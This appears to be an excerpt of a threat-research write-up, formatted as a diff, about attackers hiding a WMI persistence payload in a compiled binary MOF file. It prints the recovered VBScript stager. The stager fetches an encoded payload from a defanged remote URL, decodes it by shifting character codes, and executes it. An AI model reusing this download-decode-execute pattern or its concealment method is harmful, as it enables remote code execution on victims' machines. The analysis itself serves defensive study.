@@ -1,0 +1,19 @@
+
+The use of “mofcomp.exe” for attackers and defenders was first proposed at MIRcon 2014 by FireEye Mandiant incident responders Christopher Glyer and Devon Kerr in their “There’s Something about WMI” talk (Figure 1).
+Figure 1: Proposed use of MOF files for red and blue teams We obtained the file \"l.rar\" for further analysis and observed that the file header began with \"FOMB\".
+This file header when conveniently flipped is \"BMOF\", as in Binary Managed Object Format.
+With this information in hand we began searching for methods to reverse the compiled binary.
+Upon analyzing the file in FireEye's sandbox environment, we were able to obtain the following information from the BMOF file:
+On Error Resume 
+Next:execmydler():Function execmydler():Set P=CreateObject(\"WinHttp.
+WinHttpRequest.5.1\"):P[.]Open \"GET\",\"hxxp[://[DOMAIN]/d/dl[.]asp\",0:P[.]Send():b=
+P[.]responseText:M=
+Spli t(b,\",\",-1,1):For Each Od
+In M:
+Nd=Nd+Chr(Od-
+2):Next:
+Set P=
+Nothing:
+If Len(Nd)
+> 10 Then:Execute(Nd):End 
+If:End In an attempt to masquerade activities, the attackers wrote an MOF script and compiled it into a BMOF file, then ran the malicious BMOF file on the victim machine via WMI.
